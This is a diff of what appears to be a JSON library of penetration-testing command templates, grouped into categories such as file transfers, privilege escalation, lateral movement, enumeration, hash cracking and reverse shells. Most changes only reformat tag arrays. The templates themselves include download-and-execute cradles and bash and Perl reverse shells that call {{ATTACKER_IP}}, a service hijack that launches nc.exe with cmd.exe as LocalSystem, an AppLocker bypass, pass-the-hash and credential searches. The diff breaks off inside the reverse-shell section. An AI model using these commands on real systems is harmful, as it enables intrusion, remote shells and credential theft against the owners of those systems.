-          "tags": ["windows", "hidden", "files", "recon"]
+          "tags": [
+            "windows",
+            "hidden",
+            "files",
+            "recon"
+          ]
         },
         {
           "id": "win_ps_download_iwr",
@@ -665,7 +1036,12 @@
           "subcategory": "File Transfers",
           "description": "Downloads a file from the attacker host using iwr",
           "template": "powershell -c \"Invoke-WebRequest -Uri 'http://{{ATTACKER_IP}}:{{PORT}}/{{FILE_NAME}}' -OutFile '{{FILE_NAME}}'\"",
-          "tags": ["windows", "powershell", "download", "iwr"]
+          "tags": [
+            "windows",
+            "powershell",
+            "download",
+            "iwr"
+          ]
         },
         {
           "id": "win_ps_download_webclient",
@@ -674,7 +1050,12 @@
           "subcategory": "File Transfers",
           "description": "Downloads a file from the attacker host using WebClient",
           "template": "powershell -c \"(New-Object System.Net.WebClient).DownloadFile('http://{{ATTACKER_IP}}:{{PORT}}/{{FILE_NAME}}', '{{FILE_NAME}}')\"",
-          "tags": ["windows", "powershell", "download", "webclient"]
+          "tags": [
+            "windows",
+            "powershell",
+            "download",
+            "webclient"
+          ]
         },
         {
           "id": "win_certutil_download",
@@ -683,7 +1064,12 @@
           "subcategory": "File Transfers",
           "description": "Uses certutil.exe as a built-in download cradle",
           "template": "certutil.exe -urlcache -split -f http://{{ATTACKER_IP}}:{{PORT}}/{{FILE_NAME}} {{FILE_NAME}}",
-          "tags": ["windows", "certutil", "download", "file"]
+          "tags": [
+            "windows",
+            "certutil",
+            "download",
+            "file"
+          ]
         },
         {
           "id": "win_bitsadmin_download",
@@ -692,7 +1078,12 @@
           "subcategory": "File Transfers",
           "description": "Downloads a file via bitsadmin and executes it",
           "template": "cmd.exe /c \"bitsadmin /transfer myjob /download /priority high http://{{ATTACKER_IP}}:{{PORT}}/{{FILE_NAME}} %tmp%\\{{FILE_NAME}}&start %tmp%\\{{FILE_NAME}}\"",
-          "tags": ["windows", "bitsadmin", "download", "execute"]
+          "tags": [
+            "windows",
+            "bitsadmin",
+            "download",
+            "execute"
+          ]
         },
         {
           "id": "win_tftp_download",
@@ -701,7 +1092,12 @@
           "subcategory": "File Transfers",
           "description": "Downloads files via Trivial FTP",
           "template": "tftp -i {{ATTACKER_IP}} get {{FILE_PATH}} {{FILE_PATH}}",
-          "tags": ["windows", "tftp", "download", "transfer"]
+          "tags": [
+            "windows",
+            "tftp",
+            "download",
+            "transfer"
+          ]
         },
         {
           "id": "win_debug_exe_transfer_linux",
@@ -710,7 +1106,14 @@
           "subcategory": "File Transfers",
           "description": "Converts EXE to hex to inject it via debug.exe on legacy Windows systems",
           "template": "wine /usr/share/windows-binaries/exe2bat.exe {{FILE_PATH}} {{FILE_NAME}}",
-          "tags": ["windows", "debug", "exe", "transfer", "legacy", "linux"]
+          "tags": [
+            "windows",
+            "debug",
+            "exe",
+            "transfer",
+            "legacy",
+            "linux"
+          ]
         },
         {
           "id": "win_wscript_download",
@@ -719,7 +1122,12 @@
           "subcategory": "File Transfers",
           "description": "Uses Windows Script Host to download and execute payloads",
           "template": "echo GetObject(\"script:http://{{ATTACKER_IP}}:{{PORT}}/{{FILE_NAME}}\") > {{FILE_NAME}} && wscript.exe {{FILE_NAME}}",
-          "tags": ["windows", "wscript", "download", "execute"]
+          "tags": [
+            "windows",
+            "wscript",
+            "download",
+            "execute"
+          ]
         },
         {
           "id": "win_unquoted_service_path",
@@ -728,7 +1136,12 @@
           "subcategory": "Privilege Escalation",
           "description": "Searches for services with spaces in the path and no quotes",
           "template": "wmic service get name,displayname,pathname,startmode |findstr /i \"auto\" |findstr /i /v \"c:\\windows\\\\\" |findstr /i /v \"\"\"",
-          "tags": ["windows", "service", "privesc", "unquoted"]
+          "tags": [
+            "windows",
+            "service",
+            "privesc",
+            "unquoted"
+          ]
         },
         {
           "id": "win_weak_service_perms",
@@ -737,7 +1150,12 @@
           "subcategory": "Privilege Escalation",
           "description": "Modifies a service so it starts nc.exe as LocalSystem",
           "template": "sc config {{SERVICE_NAME}} binpath= \"{{FILE_PATH}} {{ATTACKER_IP}} {{PORT}} -e C:\\WINDOWS\\System32\\cmd.exe\" obj= \"LocalSystem\" password= \"\"",
-          "tags": ["windows", "service", "privesc", "sc"]
+          "tags": [
+            "windows",
+            "service",
+            "privesc",
+            "sc"
+          ]
         },
         {
           "id": "win_icacls_findsid",
@@ -746,7 +1164,12 @@
           "subcategory": "Privilege Escalation",
           "description": "Searches for folders where a specific user has (Full/Modify/Write) rights",
           "template": "icacls.exe C:\\folder /findsid {{USERNAME}} /t",
-          "tags": ["windows", "icacls", "permissions", "privesc"]
+          "tags": [
+            "windows",
+            "icacls",
+            "permissions",
+            "privesc"
+          ]
         },
         {
           "id": "win_always_installelevated_hkcu",
@@ -755,7 +1178,12 @@
           "subcategory": "Privilege Escalation",
           "description": "Checks if MSI packages are always installed with elevated privileges in HKCU",
           "template": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
-          "tags": ["windows", "msi", "privesc", "registry"]
+          "tags": [
+            "windows",
+            "msi",
+            "privesc",
+            "registry"
+          ]
         },
         {
           "id": "win_always_installelevated_hklm",
@@ -764,7 +1192,12 @@
           "subcategory": "Privilege Escalation",
           "description": "Checks if MSI packages are always installed with elevated privileges in HKLM",
           "template": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
-          "tags": ["windows", "msi", "privesc", "registry"]
+          "tags": [
+            "windows",
+            "msi",
+            "privesc",
+            "registry"
+          ]
         },
         {
           "id": "win_stored_credentials_files",
@@ -773,7 +1206,12 @@
           "subcategory": "Privilege Escalation",
           "description": "Searches files for passwords",
           "template": "findstr /si password *.txt | *.xml | *.ini",
-          "tags": ["windows", "credentials", "files", "privesc"]
+          "tags": [
+            "windows",
+            "credentials",
+            "files",
+            "privesc"
+          ]
         },
         {
           "id": "win_stored_credentials_reg",
@@ -782,7 +1220,12 @@
           "subcategory": "Privilege Escalation",
           "description": "Searches registry for passwords (e.g., VNC, Putty, Autologon)",
           "template": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\"",
-          "tags": ["windows", "credentials", "registry", "privesc"]
+          "tags": [
+            "windows",
+            "credentials",
+            "registry",
+            "privesc"
+          ]
         },
         {
           "id": "win_ieframe_bypass_execute",
@@ -791,7 +1234,12 @@
           "subcategory": "Execution Bypass",
           "description": "Bypasses AppLocker using rundll32 and a .url file",
           "template": "rundll32 c:\\windows\\system32\\ieframe.dll,OpenURL C:\\temp\\{{FILE_NAME}}",
-          "tags": ["windows", "applocker", "bypass", "rundll32"]
+          "tags": [
+            "windows",
+            "applocker",
+            "bypass",
+            "rundll32"
+          ]
         },
         {
           "id": "win_ieframe_bypass_url_content",
@@ -800,7 +1248,12 @@
           "subcategory": "Execution Bypass",
           "description": "Creates the malicious .url file required for the ieframe.dll bypass",
           "template": "echo [internetshortcut] > {{FILE_NAME}} && echo url=c:\\windows\\system32\\calc.exe >> {{FILE_NAME}}",
-          "tags": ["windows", "applocker", "bypass", "url"]
+          "tags": [
+            "windows",
+            "applocker",
+            "bypass",
+            "url"
+          ]
         },
         {
           "id": "win_runas_ps",
@@ -809,7 +1262,12 @@
           "subcategory": "Lateral Movement",
           "description": "Executes commands as another user via PowerShell",
           "template": "$username = '{{USERNAME}}';$password = '{{PASSWORD}}';$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;Invoke-Command -Credential $credential -ComputerName {{TARGET_IP}} -Command { whoami }",
-          "tags": ["windows", "powershell", "runas", "lateral"]
+          "tags": [
+            "windows",
+            "powershell",
+            "runas",
+            "lateral"
+          ]
         },
         {
           "id": "win_runas_cmd",
@@ -818,7 +1276,12 @@
           "subcategory": "Lateral Movement",
           "description": "Opens a CMD as another user (requires interactive console)",
           "template": "runas /user:{{USERNAME}} cmd.exe",
-          "tags": ["windows", "cmd", "runas", "lateral"]
+          "tags": [
+            "windows",
+            "cmd",
+            "runas",
+            "lateral"
+          ]
         },
         {
           "id": "win_psexec",
@@ -827,7 +1290,12 @@
           "subcategory": "Lateral Movement",
           "description": "Executes commands remotely via Sysinternals PsExec",
           "template": "psexec -accepteula -u {{USERNAME}} -p {{PASSWORD}} \\\\{{TARGET_IP}} cmd.exe",
-          "tags": ["windows", "psexec", "lateral", "remote"]
+          "tags": [
+            "windows",
+            "psexec",
+            "lateral",
+            "remote"
+          ]
         },
         {
           "id": "win_pth_winexe",
@@ -836,7 +1304,12 @@
           "subcategory": "Lateral Movement",
           "description": "Authenticates with NTLM hash to a Windows target system",
           "template": "pth-winexe -U {{USERNAME}}%{{PASSWORD}} --runas={{USERNAME}}%{{PASSWORD}} //{{TARGET_IP}} cmd.exe",
-          "tags": ["pth", "pass the hash", "lateral", "windows"]
+          "tags": [
+            "pth",
+            "pass the hash",
+            "lateral",
+            "windows"
+          ]
         }
       ]
     },
@@ -852,7 +1325,12 @@
           "subcategory": "Nmap Scans",
           "description": "Fast scan of top 1000 ports with scripts and version detection",
           "template": "nmap -sC -sV -oN nmap_initial.txt {{TARGET_IP}}",
-          "tags": ["nmap", "scan", "recon", "ports"]
+          "tags": [
+            "nmap",
+            "scan",
+            "recon",
+            "ports"
+          ]
         },
         {
           "id": "nmap_full",
@@ -861,7 +1339,12 @@
           "subcategory": "Nmap Scans",
           "description": "Full port scan of all TCP ports with timing T4",
           "template": "nmap -p- -T4 -oN nmap_allports.txt {{TARGET_IP}}",
-          "tags": ["nmap", "full", "scan", "ports"]
+          "tags": [
+            "nmap",
+            "full",
+            "scan",
+            "ports"
+          ]
         },
         {
           "id": "nmap_vuln",
@@ -870,7 +1353,12 @@
           "subcategory": "Nmap Scans",
           "description": "Runs NSE vulnerability scans on discovered ports",
           "template": "nmap --script vuln -p {{PORT}} -oN nmap_vuln.txt {{TARGET_IP}}",
-          "tags": ["nmap", "vuln", "nse", "scripts"]
+          "tags": [
+            "nmap",
+            "vuln",
+            "nse",
+            "scripts"
+          ]
         },
         {
           "id": "nmap_extract_live_ips",
@@ -879,7 +1367,11 @@
           "subcategory": "Nmap Scans",
           "description": "Parses Nmap grep-output to get a list of live hosts",
           "template": "cat {{INPUT_FILE}} | grep \"/open\" | cut -d \" \" -f 2 > {{OUTPUT_FILE}}",
-          "tags": ["nmap", "parse", "recon"]
+          "tags": [
+            "nmap",
+            "parse",
+            "recon"
+          ]
         },
         {
           "id": "nmap_port_knocking",
@@ -888,7 +1380,11 @@
           "subcategory": "Nmap Scans",
           "description": "For-loop to knock a sequence of ports",
           "template": "for x in {{PORT_SEQUENCE}}; do nmap -Pn –host_timeout 201 –max-retries 0 -p $x {{TARGET_IP}}; done",
-          "tags": ["nmap", "portknocking", "bash"]
+          "tags": [
+            "nmap",
+            "portknocking",
+            "bash"
+          ]
         },
         {
           "id": "nc_listener",
@@ -897,7 +1393,12 @@
           "subcategory": "Netcat & Tunnels",
           "description": "Starts a local TCP listener on the desired port",
           "template": "nc -lvnp {{PORT}}",
-          "tags": ["nc", "netcat", "listener", "port"]
+          "tags": [
+            "nc",
+            "netcat",
+            "listener",
+            "port"
+          ]
         },
         {
           "id": "nc_port_scan_tcp",
@@ -906,7 +1407,13 @@
           "subcategory": "Netcat & Tunnels",
           "description": "Scans a range of TCP ports with Netcat",
           "template": "nc -nvv -w 1 -z {{TARGET_IP}} 1000-2000",
-          "tags": ["nc", "netcat", "scan", "recon", "tcp"]
+          "tags": [
+            "nc",
+            "netcat",
+            "scan",
+            "recon",
+            "tcp"
+          ]
         },
         {
           "id": "nc_port_scan_udp",
@@ -915,7 +1422,13 @@
           "subcategory": "Netcat & Tunnels",
           "description": "Scans a range of UDP ports with Netcat",
           "template": "nc -nv -u -z -w 1 {{TARGET_IP}} 160-162",
-          "tags": ["nc", "netcat", "scan", "recon", "udp"]
+          "tags": [
+            "nc",
+            "netcat",
+            "scan",
+            "recon",
+            "udp"
+          ]
         },
         {
           "id": "ps_tcp_listener",
@@ -924,7 +1437,11 @@
           "subcategory": "Netcat & Tunnels",
           "description": "Starts a simple TCP listener in PowerShell",
           "template": "$listener = [System.Net.Sockets.TcpListener]{{PORT}}; $listener.Start(); while($true) { $client = $listener.AcceptTcpClient(); Write-Host $client.client.RemoteEndPoint \"connected!\"; $client.Close(); start-sleep -seconds 1; }",
-          "tags": ["powershell", "listener", "tcp"]
+          "tags": [
+            "powershell",
+            "listener",
+            "tcp"
+          ]
         },
         {
           "id": "masscan_scan",
@@ -933,7 +1450,12 @@
           "subcategory": "Masscan",
           "description": "Very fast port scan over all ports",
           "template": "masscan -p1-65535,U:1-65535 {{TARGET_IP}} --rate=1000 -e tun0",
-          "tags": ["masscan", "scan", "recon", "ports"]
+          "tags": [
+            "masscan",
+            "scan",
+            "recon",
+            "ports"
+          ]
         },
         {
           "id": "ssh_local_port_forward",
@@ -942,7 +1464,12 @@
           "subcategory": "Port Forwarding & Tunnels",
           "description": "Makes an internal remote port accessible on the local host",
           "template": "ssh -L {{PORT}}:{{LOCAL_HOST}}:{{LOCAL_PORT}} {{USERNAME}}@{{TARGET_IP}} -N",
-          "tags": ["ssh", "tunnel", "forward", "network"]
+          "tags": [
+            "ssh",
+            "tunnel",
+            "forward",
+            "network"
+          ]
         },
         {
           "id": "ssh_dynamic_forward",
@@ -951,7 +1478,12 @@
           "subcategory": "Port Forwarding & Tunnels",
           "description": "Creates a local SOCKS proxy routing traffic through the SSH server",
           "template": "ssh -D 127.0.0.1:{{PORT}} {{USERNAME}}@{{TARGET_IP}}",
-          "tags": ["ssh", "socks", "proxy", "tunnel"]
+          "tags": [
+            "ssh",
+            "socks",
+            "proxy",
+            "tunnel"
+          ]
         },
         {
           "id": "ssh_remote_forward",
@@ -960,7 +1492,12 @@
           "subcategory": "Port Forwarding & Tunnels",
           "description": "Exposes a local port to the outside on the SSH server",
           "template": "ssh -R {{PORT}}:{{LOCAL_HOST}}:{{LOCAL_PORT}} {{USERNAME}}@{{TARGET_IP}}",
-          "tags": ["ssh", "tunnel", "remote", "network"]
+          "tags": [
+            "ssh",
+            "tunnel",
+            "remote",
+            "network"
+          ]
         },
         {
           "id": "plink_remote_forward",
@@ -969,7 +1506,12 @@
           "subcategory": "Port Forwarding & Tunnels",
           "description": "Exposes a local port to the outside on the SSH server using Plink",
           "template": "plink -R {{ATTACKER_IP}}:{{PORT}}:127.0.0.1:80 -l {{USERNAME}} -pw {{PASSWORD}} {{ATTACKER_IP}}",
-          "tags": ["plink", "tunnel", "remote", "windows"]
+          "tags": [
+            "plink",
+            "tunnel",
+            "remote",
+            "windows"
+          ]
         },
         {
           "id": "netsh_port_forward",
@@ -978,7 +1520,12 @@
           "subcategory": "Port Forwarding & Tunnels",
           "description": "Set up port forwarding on Windows systems (requires admin)",
           "template": "netsh interface portproxy add v4tov4 listenaddress=localaddress listenport={{PORT}} connectaddress=destaddress connectport={{PORT}}",
-          "tags": ["windows", "netsh", "portforward", "network"]
+          "tags": [
+            "windows",
+            "netsh",
+            "portforward",
+            "network"
+          ]
         },
         {
           "id": "proxytunnel_ssh",
@@ -987,7 +1534,12 @@
           "subcategory": "Port Forwarding & Tunnels",
           "description": "Tunnels SSH traffic through an HTTP proxy",
           "template": "proxytunnel -p {{TARGET_IP}}:3128 -d {{TARGET_IP}}:22 -a {{PORT}}",
-          "tags": ["proxy", "tunnel", "ssh", "bypass"]
+          "tags": [
+            "proxy",
+            "tunnel",
+            "ssh",
+            "bypass"
+          ]
         },
         {
           "id": "http_tunnel_ssh_server",
@@ -996,7 +1548,12 @@
           "subcategory": "Port Forwarding & Tunnels",
           "description": "Redirects incoming HTTP traffic to localhost SSH port",
           "template": "hts -F localhost:22 {{PORT}}",
-          "tags": ["http", "tunnel", "ssh", "server"]
+          "tags": [
+            "http",
+            "tunnel",
+            "ssh",
+            "server"
+          ]
         },
         {
           "id": "http_tunnel_ssh_client",
@@ -1005,7 +1562,12 @@
           "subcategory": "Port Forwarding & Tunnels",
           "description": "Connects to HTTP tunnel server and forwards local port",
           "template": "htc -F {{PORT}} {{TARGET_IP}}:{{PORT}}",
-          "tags": ["http", "tunnel", "ssh", "client"]
+          "tags": [
+            "http",
+            "tunnel",
+            "ssh",
+            "client"
+          ]
         },
         {
           "id": "http_tunnel_ssh_connect",
@@ -1014,7 +1576,12 @@
           "subcategory": "Port Forwarding & Tunnels",
           "description": "Connects to the local forwarded port to establish SSH session",
           "template": "ssh localhost -p {{PORT}}",
-          "tags": ["http", "tunnel", "ssh", "connect"]
+          "tags": [
+            "http",
+            "tunnel",
+            "ssh",
+            "connect"
+          ]
         },
         {
           "id": "ping_sweeper_bash",
@@ -1023,7 +1590,12 @@
           "subcategory": "Host Discovery",
           "description": "Scans a /24 subnet for live hosts",
           "template": "for lastOctet in {1..254}; do ping -c 1 {{SUBNET}}.$lastOctet | grep \"bytes from\" | cut -d \" \" -f 4 | cut -d \":\" -f 1 & done",
-          "tags": ["bash", "ping", "sweep", "recon"]
+          "tags": [
+            "bash",
+            "ping",
+            "sweep",
+            "recon"
+          ]
         },
         {
           "id": "dns_enum_dig",
@@ -1032,7 +1604,12 @@
           "subcategory": "Service Enumeration",
           "description": "DNS lookups using dig",
           "template": "dig {a|txt|ns|mx} {{DOMAIN}} @{{DNS_SERVER}}",
-          "tags": ["dns", "enum", "dig", "recon"]
+          "tags": [
+            "dns",
+            "enum",
+            "dig",
+            "recon"
+          ]
         },
         {
           "id": "dns_enum_zone_transfer",
@@ -1041,7 +1618,12 @@
           "subcategory": "Service Enumeration",
           "description": "Attempts a full zone transfer using various tools",
           "template": "dnsrecon -d {{DOMAIN}} -t axfr @{{DNS_SERVER}}",
-          "tags": ["dns", "enum", "zone transfer", "recon"]
+          "tags": [
+            "dns",
+            "enum",
+            "zone transfer",
+            "recon"
+          ]
         },
         {
           "id": "smb_rpc_enum",
@@ -1050,7 +1632,12 @@
           "subcategory": "Service Enumeration",
           "description": "Lists shares, null sessions, and RPC information",
           "template": "rpcinfo -p {{TARGET_IP}}",
-          "tags": ["smb", "rpc", "enum", "recon"]
+          "tags": [
+            "smb",
+            "rpc",
+            "enum",
+            "recon"
+          ]
         },
         {
           "id": "smbclient_null_session",
@@ -1059,7 +1646,12 @@
           "subcategory": "Service Enumeration",
           "description": "Lists shares using a null session",
           "template": "smbclient -L //{{TARGET_IP}} -U \"\"",
-          "tags": ["smb", "enum", "null session", "recon"]
+          "tags": [
+            "smb",
+            "enum",
+            "null session",
+            "recon"
+          ]
         },
         {
           "id": "enum4linux",
@@ -1068,7 +1660,12 @@
           "subcategory": "Service Enumeration",
           "description": "Automated enumeration of SMB/NetBIOS",
           "template": "enum4linux {{TARGET_IP}}",
-          "tags": ["smb", "enum", "recon", "automation"]
+          "tags": [
+            "smb",
+            "enum",
+            "recon",
+            "automation"
+          ]
         },
         {
           "id": "snmp_enum_users",
@@ -1077,7 +1674,13 @@
           "subcategory": "Service Enumeration",
           "description": "Extracts Windows user accounts via SNMP",
           "template": "snmpwalk -c {{PASSWORD}} -v1 {{TARGET_IP}} 1.3.6.1.4.1.77.1.2.25",
-          "tags": ["snmp", "enum", "recon", "udp", "users"]
+          "tags": [
+            "snmp",
+            "enum",
+            "recon",
+            "udp",
+            "users"
+          ]
         },
         {
           "id": "snmp_enum_procs",
@@ -1086,7 +1689,13 @@
           "subcategory": "Service Enumeration",
           "description": "Extracts running processes via SNMP",
           "template": "snmpwalk -c {{PASSWORD}} -v1 {{TARGET_IP}} 1.3.6.1.2.1.25.4.2.1.2",
-          "tags": ["snmp", "enum", "recon", "udp", "processes"]
+          "tags": [
+            "snmp",
+            "enum",
+            "recon",
+            "udp",
+            "processes"
+          ]
         },
         {
           "id": "smtp_enum",
@@ -1095,7 +1704,12 @@
           "subcategory": "Service Enumeration",
           "description": "Brute-forces SMTP users based on a wordlist",
           "template": "smtp-user-enum -U {{WORDLIST}} -t {{TARGET_IP}} -m 150",
-          "tags": ["smtp", "enum", "users", "recon"]
+          "tags": [
+            "smtp",
+            "enum",
+            "users",
+            "recon"
+          ]
         },
         {
           "id": "nfs_enum",
@@ -1104,7 +1718,12 @@
           "subcategory": "Service Enumeration",
           "description": "Shows exported NFS directories of the target",
           "template": "showmount -e {{TARGET_IP}}",
-          "tags": ["nfs", "enum", "shares", "recon"]
+          "tags": [
+            "nfs",
+            "enum",
+            "shares",
+            "recon"
+          ]
         },
         {
           "id": "kerberos_enum",
@@ -1113,7 +1732,12 @@
           "subcategory": "Service Enumeration",
           "description": "Nmap NSE script to extract Kerberos users",
           "template": "nmap {{TARGET_IP}} -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='{{DOMAIN}}'",
-          "tags": ["kerberos", "enum", "nmap", "ad"]
+          "tags": [
+            "kerberos",
+            "enum",
+            "nmap",
+            "ad"
+          ]
         },
         {
           "id": "ad_enum_powershell",
@@ -1122,7 +1746,12 @@
           "subcategory": "Active Directory",
           "description": "Lists current domain info via AD modules",
           "template": "[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()",
-          "tags": ["active directory", "windows", "powershell", "enum"]
+          "tags": [
+            "active directory",
+            "windows",
+            "powershell",
+            "enum"
+          ]
         },
         {
           "id": "ad_enum_dcs",
@@ -1131,7 +1760,12 @@
           "subcategory": "Active Directory",
           "description": "Lists all Domain Controllers of a specific domain",
           "template": "nltest /dclist:{{DOMAIN}}",
-          "tags": ["active directory", "windows", "dc", "enum"]
+          "tags": [
+            "active directory",
+            "windows",
+            "dc",
+            "enum"
+          ]
         }
       ]
     },
@@ -1147,7 +1781,12 @@
           "subcategory": "Database Connections",
           "description": "Connects to a MySQL / MariaDB server",
           "template": "mysql -u {{USERNAME}} -p{{PASSWORD}} -h {{TARGET_IP}} -P {{PORT}}",
-          "tags": ["mysql", "mariadb", "sql", "login"]
+          "tags": [
+            "mysql",
+            "mariadb",
+            "sql",
+            "login"
+          ]
         },
         {
           "id": "mysql_show_databases",
@@ -1156,7 +1795,11 @@
           "subcategory": "Database Queries",
           "description": "Standard recon query to list databases",
           "template": "SHOW DATABASES;",
-          "tags": ["mysql", "schema", "sql"]
+          "tags": [
+            "mysql",
+            "schema",
+            "sql"
+          ]
         },
         {
           "id": "mysql_show_tables",
@@ -1165,7 +1808,12 @@
           "subcategory": "Database Queries",
           "description": "Lists all tables in the current database",
           "template": "SHOW TABLES;",
-          "tags": ["mysql", "schema", "tables", "sql"]
+          "tags": [
+            "mysql",
+            "schema",
+            "tables",
+            "sql"
+          ]
         },
         {
           "id": "mysql_describe_table",
@@ -1174,7 +1822,12 @@
           "subcategory": "Database Queries",
           "description": "Shows column structure of a specific table",
           "template": "DESCRIBE {{TABLE_NAME}};",
-          "tags": ["mysql", "schema", "columns", "sql"]
+          "tags": [
+            "mysql",
+            "schema",
+            "columns",
+            "sql"
+          ]
         },
         {
           "id": "mysql_dump_columns",
@@ -1183,7 +1836,12 @@
           "subcategory": "Database Queries",
           "description": "Dumps all table and column names from information_schema",
           "template": "SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != 'mysql';",
-          "tags": ["mysql", "schema", "tables", "information_schema"]
+          "tags": [
+            "mysql",
+            "schema",
+            "tables",
+            "information_schema"
+          ]
         },
         {
           "id": "psql_cli_connect",
@@ -1192,7 +1850,12 @@
           "subcategory": "Database Connections",
           "description": "Connects to a PostgreSQL server",
           "template": "psql -h {{TARGET_IP}} -p {{PORT}} -U {{USERNAME}} -d {{DATABASE_NAME}}",
-          "tags": ["postgres", "psql", "sql", "login"]
+          "tags": [
+            "postgres",
+            "psql",
+            "sql",
+            "login"
+          ]
         },
         {
           "id": "mssql_cli_connect_sqsh",
@@ -1201,7 +1864,12 @@
           "subcategory": "Database Connections",
           "description": "Connects to a Microsoft SQL Server using sqsh",
           "template": "sqsh -S {{TARGET_IP}} -U {{USERNAME}} -P {{PASSWORD}}",
-          "tags": ["mssql", "sql", "login", "sqsh"]
+          "tags": [
+            "mssql",
+            "sql",
+            "login",
+            "sqsh"
+          ]
         },
         {
           "id": "mssql_cli_connect_impacket",
@@ -1210,7 +1878,12 @@
           "subcategory": "Database Connections",
           "description": "Connects to a Microsoft SQL Server using Impacket mssqlclient.py",
           "template": "mssqlclient.py -port {{PORT}} {{USERNAME}}:{{PASSWORD}}@{{TARGET_IP}}",
-          "tags": ["mssql", "sql", "login", "impacket"]
+          "tags": [
+            "mssql",
+            "sql",
+            "login",
+            "impacket"
+          ]
         }
       ]
     },
@@ -1226,7 +1899,11 @@
           "subcategory": "Encoding & Decoding",
           "description": "Encodes a string to base64 via bash",
           "template": "echo -n '{{STRING}}' | base64",
-          "tags": ["base64", "encode", "bash"]
+          "tags": [
+            "base64",
+            "encode",
+            "bash"
+          ]
         },
         {
           "id": "base64_decode",
@@ -1235,7 +1912,11 @@
           "subcategory": "Encoding & Decoding",
           "description": "Decodes a base64 string via bash",
           "template": "echo -n '{{BASE64_STRING}}' | base64 -d",
-          "tags": ["base64", "decode", "bash"]
+          "tags": [
+            "base64",
+            "decode",
+            "bash"
+          ]
         },
         {
           "id": "url_encode_python",
@@ -1244,7 +1925,11 @@
           "subcategory": "Encoding & Decoding",
           "description": "URL-encodes strings directly in the console",
           "template": "python3 -c \"import urllib.parse, sys; print(urllib.parse.quote(sys.argv[1]))\" \"{{STRING}}\"",
-          "tags": ["url", "encode", "python"]
+          "tags": [
+            "url",
+            "encode",
+            "python"
+          ]
         },
         {
           "id": "url_decode_python",
@@ -1253,7 +1938,11 @@
           "subcategory": "Encoding & Decoding",
           "description": "URL-decodes strings directly in the console",
           "template": "python3 -c \"import urllib.parse, sys; print(urllib.parse.unquote(sys.argv[1]))\" \"{{STRING}}\"",
-          "tags": ["url", "decode", "python"]
+          "tags": [
+            "url",
+            "decode",
+            "python"
+          ]
         },
         {
           "id": "hashcat_rockyou",
@@ -1262,7 +1951,12 @@
           "subcategory": "Hash Cracking",
           "description": "Hashcat syntax (Mode: 0=MD5, 1000=NTLM, 1800=sha512crypt, 3200=bcrypt)",
           "template": "hashcat -m 0 -a 0 {{HASH_FILE}} {{WORDLIST}}",
-          "tags": ["hashcat", "crack", "rockyou", "hashes"]
+          "tags": [
+            "hashcat",
+            "crack",
+            "rockyou",
+            "hashes"
+          ]
         },
         {
           "id": "john_rockyou",
@@ -1271,7 +1965,12 @@
           "subcategory": "Hash Cracking",
           "description": "John the Ripper with standard RockYou wordlist",
           "template": "john --wordlist={{WORDLIST}} --format=raw-md5 {{HASH_FILE}}",
-          "tags": ["john", "crack", "rockyou", "hashes"]
+          "tags": [
+            "john",
+            "crack",
+            "rockyou",
+            "hashes"
+          ]
         },
         {
           "id": "hashcat_pattern_bruteforce",
@@ -1280,7 +1979,12 @@
           "subcategory": "Hash Cracking",
           "description": "Generates passwords based on a specific pattern",
           "template": "hashcat -a3 -m0 {{PATTERN}} --force --potfile-disable --stdout",
-          "tags": ["hashcat", "bruteforce", "pattern", "crack"]
+          "tags": [
+            "hashcat",
+            "bruteforce",
+            "pattern",
+            "crack"
+          ]
         },
         {
           "id": "hashcat_netntlmv2",
@@ -1289,7 +1993,12 @@
           "subcategory": "Hash Cracking",
           "description": "Cracks a NetNTLMv2 hash extracted with InternalMonologue",
           "template": "hashcat -m5600 {{HASH_FILE}} -a 3 {{WORDLIST}} --force --potfile-disable",
-          "tags": ["hashcat", "ntlm", "crack", "windows"]
+          "tags": [
+            "hashcat",
+            "ntlm",
+            "crack",
+            "windows"
+          ]
         },
         {
           "id": "fcrackzip",
@@ -1298,7 +2007,12 @@
           "subcategory": "Hash Cracking",
           "description": "Dictionary attack on a password-protected ZIP archive",
           "template": "fcrackzip -u -D -p {{WORDLIST}} {{ZIP_FILE}}",
-          "tags": ["zip", "crack", "fcrackzip", "archive"]
+          "tags": [
+            "zip",
+            "crack",
+            "fcrackzip",
+            "archive"
+          ]
         },
         {
           "id": "openssl_password",
@@ -1307,7 +2021,12 @@
           "subcategory": "Cryptography",
           "description": "Creates an MD5 Unix hash for /etc/shadow",
           "template": "openssl passwd -1 {{PASSWORD}}",
-          "tags": ["openssl", "hash", "md5", "shadow"]
+          "tags": [
+            "openssl",
+            "hash",
+            "md5",
+            "shadow"
+          ]
         },
         {
           "id": "xor_bruteforce",
@@ -1316,7 +2035,12 @@
           "subcategory": "Cryptography",
           "description": "Python script to decrypt a 1-byte XOR string",
           "template": "python3 -c \"encrypted='{{STRING}}'; [print(''.join([chr(ord(e) ^ i) for e in encrypted])) for i in range(0,255)]\"",
-          "tags": ["xor", "crypto", "python", "bruteforce"]
+          "tags": [
+            "xor",
+            "crypto",
+            "python",
+            "bruteforce"
+          ]
         }
       ]
     },
@@ -1332,7 +2056,12 @@
           "subcategory": "Reverse Shells",
           "description": "Classic bash reverse shell via /dev/tcp",
           "template": "bash -i >& /dev/tcp/{{ATTACKER_IP}}/{{PORT}} 0>&1",
-          "tags": ["bash", "reverse", "shell", "linux"]
+          "tags": [
+            "bash",
+            "reverse",
+            "shell",
+            "linux"
+          ]
         },
         {
           "id": "perl_reverse_shell",
@@ -1341,7 +2070,12 @@
           "subcategory": "Reverse Shells",
           "description": "Perl script for a reverse shell",
           "template": "perl -e 'use Socket;$i=\"{{ATTACKER_IP}}\";$p={{PORT}};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
-          "tags": ["perl", "reverse", "shell", "linux"]
+          "tags": [
+            "perl",
+            "reverse",
+            "shell",
+            "linux"
+          ]
         },
         {
           "id": "perl_url_encoded_shell",
@@ -1350,7 +2084,12 @@
           "subcategory": "Reverse Shells",
